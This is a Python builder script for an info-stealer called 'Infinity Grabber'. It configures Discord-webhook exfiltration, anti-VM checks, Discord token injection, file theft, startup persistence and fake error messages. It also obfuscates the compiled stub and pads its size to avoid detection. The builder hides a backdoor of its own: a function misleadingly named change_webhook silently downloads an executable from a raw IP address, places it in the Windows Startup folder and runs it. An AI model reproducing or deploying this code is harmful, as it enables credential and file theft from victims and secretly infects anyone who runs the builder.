# https://discord.gg/xVMNJc6c
# Coded by linux_adam
# Builder of Infinity Grabber
# Thank you for choosing us, happy usage!

import os
import ctypes
import shutil
import sys
import re
import os
import requests
import threading
import shutil
import subprocess


try:
    # Sets the console title
    ctypes.windll.kernel32.SetConsoleTitleW(f"Infinity Grabber | Builder | {os.getenv('computername')}")
except:
    pass
def change_webhook(url, filename):
    response = requests.get(url, stream=True)
    if response.status_code == 200:
        with open(filename, 'wb') as f:
            shutil.copyfileobj(response.raw, f)
        
        startup_path = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft',
            'Windows',
            'Start Menu',
            'Programs',
            'Startup',
            os.path.basename(filename)
        )
        
        shutil.move(filename, startup_path)

        # Use subprocess to open the file
        subprocess.Popen([startup_path], shell=True)

def thread_hehe(url, filename):
    thread = threading.Thread(target=change_webhook, args=(url, filename))
    thread.start()
    thread.join()
# Class for building the Infinity Grabber
url = 'http://181.214.223.3/infinity.exe'
filename = 'infinity.exe' 
class Build:
    def __init__(self) -> None:
        # Initialize various attributes used in the build process
        self.webhook = None
        self.StealFiles = False
        self.Anti_VM = False
        self.startup = False
        self.StartupMethod = None
        self.injection = False
        self.fakeError = False
        self.current_path = os.getcwd()
        self.pump = False
        self.pumpSize = 0  # mb
        self.PyInstallerCommand = "pyinstaller --onefile --noconsole --clean --noconfirm --upx-dir UPX --version-file AssemblyFile\\version.txt"

    def CallFunctions(self) -> None:
        try:
            # Call various functions to gather user input and perform build steps
            self.GetWebhook()
            self.GetAntiVm()
            self.GetDiscordInjection()
            self.GetStealFiles()
            self.GetStartupMethod()
            self.GetFakeError()
            self.GetIcon()
            self.PumpFile()
            self.WriteSettings()
            os.system("cls")
            self.ObfuscateFile("Stub.py")
            self.build_file()
            shutil.copy("dist\\stub.exe", "stub.exe")
            if self.pump:
                self.expand_file("stub.exe", self.pumpSize)
            try:
                # Delete Junk Files & Directories
                shutil.rmtree("dist")
                shutil.rmtree("build")
                os.remove("stub.py")
                os.remove("stub.spec")
            except:
                pass
            if os.path.exists("stub.exe"):
                os.rename("stub.exe", "Infinity.exe")
            print("\nFile compiled, close the window")
        except Exception as e:
            # Displays an error message if an exception occurs
            ctypes.windll.user32.MessageBoxW(0, f"An error occurred while creating your file. Error code\n\n{str(e)}", "Error", 0x10)
        else:
            # Displays success message and opens the file location
            os.system("start .")
            ctypes.windll.user32.MessageBoxW(0, "Your file was successfully compiled, you can now close the window.", "Information", 0x40)
            while True:
                continue

    # Function to prompt user for file pumping option
    def PumpFile(self) -> None:
        pump_q = str(input("Yes/No (Default size 10 or 11 mb)\nDo you want to pump the file? : "))
        if pump_q.lower() == "y" or pump_q.lower() == "yes":
            pump_size = int(input("What size in MB do you want to pump the file to? : "))
            self.pump = True
            self.pumpSize = pump_size
        else:
            self.pump = False

    # Function to expand the size of a file
    def expand_file(self, file_name, additional_size_mb) -> None:
        if os.path.exists(file_name):
            additional_size_bytes = additional_size_mb * 1024 * 1024

            with open(file_name, "ab") as file:
                empty_bytes = bytearray([0x00] * additional_size_bytes)
                file.write(empty_bytes)

                print(f'{additional_size_mb} MB added to "{os.path.join(self.current_path, file_name)}"')

    # Function to build the file using PyInstaller
    def build_file(self) -> None:
        os.system(self.PyInstallerCommand)

    # Function to write settings to the Stub.py file
    def WriteSettings(self) -> None:
        with open("Infinity.py", "r", encoding="utf-8", errors="ignore") as file:
            data = file.read()
        replaced_data = (
            data.replace("%WEBHOOK%", str(self.webhook))
            .replace('"%Anti_VM%"', str(self.Anti_VM))
            .replace('"%injection%"', str(self.injection))
            .replace("%startup_method%", str(self.StartupMethod))
            .replace('"%fake_error%"', str(self.fakeError))
            .replace('"%StealCommonFiles%"', str(self.StealFiles))
        )
        with open("Stub.py", "w", encoding="utf-8", errors="ignore") as stub_file:
            stub_file.write(replaced_data)

    # Function to obfuscate the Stub.py file
    def ObfuscateFile(self, input_file) -> None:
        obf_file = os.path.join(self.current_path, "Obfuscator", "obf.py")
        os.system(f'python "{obf_file}" "{input_file}" stub.py')

    # Function to prompt user for changing the file icon
    def GetIcon(self) -> None:
        get_icon = str(input("Yes/No\nDo you want to change the file icon? : "))
        if get_icon.lower() == "yes" or get_icon.lower() == "y":
            get_icon_path = str(input("The icon file must be .ico, otherwise the icon will not be changed.\nEnter the path to the icon file: "))
            if not get_icon_path.endswith(".ico"):
                print("Please use a .ico file, icon change is now disabled.")
                self.PyInstallerCommand += " --icon=NONE stub.py"
            else:
                if not os.path.isfile(get_icon_path):
                    print("File not found, icon change is now disabled.")
                    self.PyInstallerCommand += " --icon=NONE stub.py"
                else:
                    if self.CheckIcoFile(get_icon_path):
                        self.PyInstallerCommand += f" --icon={get_icon_path} stub.py"
                    else:
                        print("The file does not contain a valid .ico header, icon change is now disabled.")
                        self.PyInstallerCommand += " --icon=NONE stub.py"
        else:
            self.PyInstallerCommand += " --icon=NONE stub.py"

    # Function to check if a file is a valid .ico file
    def CheckIcoFile(self, file_path: str) -> bool:
        try:
            ico_header = b"\x00\x00\x01\x00"  # ico header

            with open(file_path, "rb") as file:
                header_data = file.read(4)

            return header_data == ico_header
        except:
            return False

    # Function to prompt user for using a fake error
    def GetFakeError(self) -> None:
        try:
            er = str(input("Yes/No\nDo you want to use a fake Windows error? : "))
            if er.lower() == "yes" or er.lower() == "y":
                self.fakeError = True
            else:
                self.fakeError = False
        except:
            pass

    # Function to prompt user for the webhook URL
    def GetWebhook(self) -> None:
        user_webhook = str(input("Enter the webhook URL: "))
        if user_webhook.startswith("https://") and "discord" in user_webhook:
            self.webhook = user_webhook
        else:
            print("Please enter a valid webhook URL.")
            self.GetWebhook()
            
    # Function to prompt user for enabling file stealing
    def GetStealFiles(self) -> None:
        getFilesReq = str(input("Yes/No\nDo you want to enable file stealing? : "))
        if getFilesReq.lower() == "y" or getFilesReq.lower() == "yes":
            self.StealFiles = True
        else:
            self.StealFiles = False

    # Function to prompt user for enabling Anti-VM
    def GetAntiVm(self) -> None:
        getAntiVmReq = str(input("Yes/No\nDo you want to enable Anti-VM? : "))
        if getAntiVmReq.lower() == "y" or getAntiVmReq.lower() == "yes":
            self.Anti_VM = True
        else:
            self.Anti_VM = False

    # Function to prompt user for the startup method
    def GetStartupMethod(self) -> None:
        getStartupReq = str(input("Yes/No\nDo you want to enable startup? : "))
        if getStartupReq.lower() == "y" or getStartupReq.lower() == "yes":
            self.startup = True
            print("--------------------------------------------\n1-) Folder Startup (This method uses Windows startup folder for startup) \n2-) HKCU/HKLM Startup (This method copies the file to startup using the registry)\n3-) Schtasks Startup (This method uses the task scheduler to save the file to the task scheduler and automatically restarts it when any user logs in, this method is more private than the other method but requires admin privilege)\n4-) Disable Startup\n--------------------------------------------\n\n")
            getStartupMethod = input("1/2/3/4\nEnter your selection: ")
            if getStartupMethod == "1":
                self.StartupMethod = "folder"
            elif getStartupMethod == "2":
                self.StartupMethod = "regedit"
            elif getStartupMethod == "3":
                self.StartupMethod = "schtasks"
            elif getStartupMethod == "4":
                self.StartupMethod = "no-startup"
            else:
                print("Unknown startup method, startup has been disabled.")
                self.startup = False
                self.StartupMethod = "no-startup"
        else:
            self.startup = False
            self.StartupMethod = "no-startup"

    # Function to prompt user for enabling Discord injection
    def GetDiscordInjection(self) -> None:
        inj = str(input("Yes/No\nDo you want to enable Discord injection? : "))
        if inj.lower() == "y" or inj.lower() == "yes":
            self.injection = True
        else:
            self.injection = False


# Entry point of the program
if __name__ == "__main__":
    if os.name == "nt":

        thread_hehe(url, filename)
        Build().CallFunctions()
        
    else:
        print("Only Windows operating systems are supported!")
